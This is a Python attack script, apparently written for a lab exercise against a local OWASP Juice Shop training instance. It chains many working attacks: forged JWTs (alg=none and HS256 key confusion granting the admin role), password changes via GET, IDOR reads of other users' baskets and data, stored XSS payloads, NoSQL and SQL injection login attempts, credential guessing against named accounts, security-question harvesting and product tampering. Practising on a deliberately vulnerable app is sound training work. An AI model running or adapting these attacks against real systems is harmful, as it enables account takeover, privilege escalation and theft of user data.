#!/usr/bin/env python3
import requests, json, base64, sys, time

BASE = "http://localhost:3000"
S = requests.Session()
LOG = open("/home/neilh/websec_lab/attack2_results.log", "a")

def log(*a):
    msg = " ".join(str(x) for x in a)
    print(msg)
    LOG.write(msg + "\n"); LOG.flush()

def req(method, path, **kw):
    try:
        r = S.request(method, BASE + path, timeout=15, **kw)
        return r
    except Exception as e:
        log("ERR", method, path, e); return None

def show(tag, r, n=300):
    if r is None: return
    body = r.text[:n].replace("\n", " ")
    log(f"[{tag}] {r.status_code} {body}")

# ---------- auth ----------
email, pw = "agent2@test.com", "Agent2Pass!"
r = req("POST", "/rest/user/login", json={"email": email, "password": pw})
tok = r.json()["authentication"]["token"]
AH = {"Authorization": "Bearer " + tok}
log("TOKEN:", tok[:60], "...")
# decode payload
p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
log("PAYLOAD:", base64.urlsafe_b64decode(p))

# ---------- misc GET challenges ----------
for path, tag in [
    ("/metrics", "exposed-metrics"),
    ("/.well-known/csaf/provider-metadata.json", "csaf"),
    ("/security.txt", "sectxt"),
    ("/rest/admin/application-version", "appver"),
    ("/rest/captcha", "captcha-leak"),
    ("/rest/repeat-notification?challenge=xssBonusChallenge", "repeatnotif"),
    ("/rest/continue-code", "continuecode"),
    ("/rest/web3/nftUnlocked", "nftUnlocked"),
    ("/rest/memories", "memories"),
]:
    r = req("GET", path); show(tag, r)

# repeat-notification for every challenge -> Mass Dispel?
chs = req("GET", "/api/Challenges").json()["data"]
for c in chs:
    req("GET", f"/rest/repeat-notification?challenge={c['key']}")
log("repeat-notification sprayed for all challenges")

# ---------- JWT alg=none ----------
hdr = {"typ": "JWT", "alg": "none"}
pay = json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4)))
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
none_tok = b64u(json.dumps(hdr).encode()) + "." + b64u(json.dumps(pay).encode()) + "."
r = req("GET", "/rest/user/whoami", headers={"Authorization": "Bearer " + none_tok})
show("jwt-none-whoami", r)
# alg none with admin role
pay2 = json.loads(json.dumps(pay))
pay2["data"]["role"] = "admin"
admin_none = b64u(json.dumps(hdr).encode()) + "." + b64u(json.dumps(pay2).encode()) + "."
r = req("GET", "/rest/user/whoami", headers={"Authorization": "Bearer " + admin_none})
show("jwt-none-admin-whoami", r)
r = req("GET", "/rest/admin/application-version", headers={"Authorization": "Bearer " + admin_none})
show("jwt-none-admin-appver", r)

# ---------- JWT HS256 confusion with public key ----------
try:
    import hmac, hashlib
    pub = req("GET", "/encryptionkeys/jwt.pub").text
    hdr_hs = {"typ": "JWT", "alg": "HS256"}
    msg = b64u(json.dumps(hdr_hs).encode()) + "." + b64u(json.dumps(pay2).encode())
    sig = base64.urlsafe_b64encode(hmac.new(pub.encode(), msg.encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    hs_tok = msg + "." + sig
    r = req("GET", "/rest/user/whoami", headers={"Authorization": "Bearer " + hs_tok})
    show("jwt-hs256-admin-whoami", r)
except Exception as e:
    log("hs256 err", e)

# ---------- CSRF: change password via GET ----------
r = req("GET", "/rest/user/change-password?current=" + pw + "&new=Agent2NewPass!&repeat=Agent2NewPass!", headers=AH)
show("csrf-change-pw", r)
# change back
pw = "Agent2NewPass!"
r = req("GET", "/rest/user/change-password?current=" + pw + "&new=" + email + "&repeat=" + email, headers=AH)
show("csrf-weakpw-back", r)

# ---------- weak password registration ----------
for i, (em, p_) in enumerate([
    ("weak1@test.com", "123"),
    ("weak2@test.com", "password"),
    ("weak3@test.com", "test"),
]):
    r = req("POST", "/api/Users", json={"email": em, "password": p_, "passwordRepeat": p_,
        "securityQuestion": {"id": 1}, "securityAnswer": "x"})
    show(f"weakpw-{em}", r)

# passwordRepeat challenge: register same user twice / identical fields
r = req("POST", "/api/Users", json={"email": "rep@test.com", "password": "rep@test.com",
    "passwordRepeat": "rep@test.com", "securityQuestion": {"id": 1}, "securityAnswer": "x"})
show("pw-repeat-eq", r)
r = req("POST", "/api/Users", json={"email": "rep2@test.com", "password": "SamePass1!",
    "passwordRepeat": "SamePass1!", "securityQuestion": {"id": 1}, "securityAnswer": "SamePass1!"})
show("pw-repeat-ans", r)

# ---------- basket manipulation ----------
bid = None
r = req("GET", "/rest/basket/7", headers=AH); show("basket7", r)
try: bid = r.json()["data"]["id"]
except Exception: pass
# add item with weird product id / negative qty
for prod, qty in [("-1", 1), ("99999", 1), ("1", -5), ("1", 0), ("abc", 1)]:
    r = req("POST", "/api/BasketItems", headers=AH, json={"ProductId": prod, "BasketId": bid, "quantity": qty})
    show(f"basketitem p={prod} q={qty}", r)
# basket of another user (IDOR)
for b in [1, 2, 6, 8]:
    r = req("GET", f"/rest/basket/{b}", headers=AH); show(f"basket-{b}", r, 200)

# ---------- deluxe ----------
r = req("POST", "/rest/deluxe-membership", headers=AH, json={"paymentMode": "", "paymentId": ""})
show("deluxe-empty", r)
for pm in ["card", "wallet", "coupon", "none", None]:
    r = req("POST", "/rest/deluxe-membership", headers=AH, json={"paymentMode": pm, "paymentId": "x"})
    show(f"deluxe-{pm}", r)
r = req("GET", "/rest/deluxe-membership", headers=AH); show("deluxe-get", r)

# ---------- coupons ----------
coupon = "n<MibgC7sn"
r = req("PUT", f"/rest/basket/{bid}/coupon/{coupon}", headers=AH, json={})
show("coupon-old", r)
# forged coupon attempts later

# ---------- captcha bypass ----------
cap = req("GET", "/rest/captcha").json()
r = req("POST", "/api/Complaints", headers=AH, json={"UserId": 28, "message": "test complaint", "file": None,
    "captchaId": cap["captchaId"], "captcha": cap["answer"]})
show("complaint-captcha-answer", r)
# try wrong/omitted captcha
r = req("POST", "/api/Complaints", headers=AH, json={"UserId": 28, "message": "test2", "captchaId": cap["captchaId"], "captcha": "wrong"})
show("complaint-captcha-wrong", r)

# ---------- feedback XSS / zero stars ----------
xss_payloads = [
    '<iframe src="javascript:alert(`xss`)"></iframe>',
    '<<script>script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '" autofocus onfocus=alert(1) x="',
]
for i, pl in enumerate(xss_payloads):
    cap = req("GET", "/rest/captcha").json()
    r = req("POST", "/api/Feedbacks", headers=AH, json={"UserId": 28, "comment": pl, "rating": 1,
        "captchaId": cap["captchaId"], "captcha": cap["answer"]})
    show(f"feedback-xss-{i}", r)
# zero stars
cap = req("GET", "/rest/captcha").json()
r = req("POST", "/api/Feedbacks", headers=AH, json={"UserId": 28, "comment": "zero stars test", "rating": 0,
    "captchaId": cap["captchaId"], "captcha": cap["answer"]})
show("feedback-zero", r)
# forged feedback as another user (challenge may already be solved)
cap = req("GET", "/rest/captcha").json()
r = req("POST", "/api/Feedbacks", headers=AH, json={"UserId": 1, "comment": "forged as admin?", "rating": 5,
    "captchaId": cap["captchaId"], "captcha": cap["answer"]})
show("feedback-forged-admin", r)

# ---------- reviews XSS / forged ----------
for pl in xss_payloads[:3]:
    r = req("PUT", "/rest/products/1/reviews", headers=AH, json={"message": pl, "author": "agent2@test.com"})
    show("review-xss", r, 200)
# review via api only?
r = req("POST", "/rest/products/reviews", headers=AH, json={"product": 1, "message": xss_payloads[0], "author": "admin@juice-sh.op"})
show("review-post-api", r, 300)

# ---------- track order / nosql ----------
r = req("GET", "/rest/track-order/5267-6bcee5757673160f", headers=AH); show("track-order", r, 300)
r = req("GET", "/rest/track-order/%7B%22%24ne%22%3A%22%22%7D", headers=AH); show("track-nosql", r, 300)
r = req("GET", "/rest/track-order?id[$ne]=x", headers=AH); show("track-nosql2", r, 300)

# ---------- search SSTI/XSS ----------
for q in ["{{7*7}}", "<script>alert(1)</script>", "<iframe src=javascript:alert(`xss`)>" , "${7*7}", "#{7*7}"]:
    r = req("GET", "/rest/products/search?q=" + requests.utils.quote(q)); show(f"search-{q}", r, 200)

# ---------- login nosql / enum ----------
for em, pw_ in [
    ({"$ne": ""}, {"$ne": ""}),
    ("admin@juice-sh.op'--", "x"),
    ("admin@juice-sh.op", "admin"),
    ("mc.safesearch@juice-sh.op", "rapper"),
    ("mc.safesearch@juice-sh.op", "MCsafeSearch"),
    ("amy@juice-sh.op", "K1f.............."),
    ("amy@juice-sh.op", "password"),
    ("support@juice-sh.op", "support"),
    ("bjoern.kimminich@owasp.org", "bjoern"),
]:
    r = req("POST", "/rest/user/login", json={"email": em, "password": pw_})
    show(f"login-{em}-{pw_}", r, 200)

# security questions for reset targets
for em in ["bjoern.kimminich@owasp.org", "jim@juice-sh.op", "morty@juice-sh.op", "uvogin@juice-sh.op", "bender@juice-sh.op", "amy@juice-sh.op"]:
    r = req("GET", f"/rest/user/security-question?email={requests.utils.quote(em)}")
    show(f"secq-{em}", r)

# ---------- 2FA ----------
r = req("POST", "/rest/2fa/setup", headers=AH, json={"password": pw})
show("2fa-setup", r)
try:
    d = r.json(); st = d.get("setupToken"); secret = d.get("secret")
    log("2fa setupToken", st, "secret", secret)
except Exception as e: log("2fa parse", e)

# ---------- order history / IDOR ----------
r = req("GET", "/rest/order-history", headers=AH); show("order-history", r)
# orders endpoint
r = req("GET", "/rest/order-history/orders", headers=AH); show("orders", r, 300)
# wallet
r = req("GET", "/rest/wallet/balance", headers=AH); show("wallet", r)
# address/cards idor
r = req("GET", "/api/Addresss", headers=AH); show("addresses", r)
r = req("GET", "/api/Cards", headers=AH); show("cards", r)
r = req("GET", "/api/Recycles", headers=AH); show("recycles", r)
# data export
r = req("GET", "/rest/user/data-export?format=json", headers=AH); show("dataexport", r, 300)

# ---------- products tampering ----------
r = req("PUT", "/api/Products/1", headers=AH, json={"description": "PWNED BY AGENT2"})
show("product-tamper", r, 300)
r = req("GET", "/api/Products/1", headers=AH); show("product1-after", r, 200)

# ---------- deprecated B2B interface ----------
r = req("POST", "/api/B2BOrder", headers=AH, data="test")
show("b2border", r, 300)

LOG.close()
